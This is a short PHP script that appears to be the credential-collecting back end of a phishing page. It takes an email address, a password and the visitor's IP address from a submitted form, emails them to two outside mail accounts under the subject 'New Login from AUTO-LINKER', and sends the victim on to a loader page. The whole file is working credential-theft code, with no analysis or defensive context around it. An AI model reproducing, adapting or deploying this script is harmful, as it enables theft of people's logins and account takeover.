<?


$ip = getenv("REMOTE_ADDR");
$message .= "--------------New Login--------\n";
$message .= "Email-ID : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['pass1']."\n";
$message .= "Retype Password : ".$_POST['pass2']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created BY 004-----------\n";
$send = "lightmusic12345@yandex.com,test.result.x.leet@gmail.com";
$subject = "New Login from AUTO-LINKER - $ip";


mail($send,$subject,$message,$headers);


$redirect = "loader.html";

header("Location: " . $redirect);
 
?>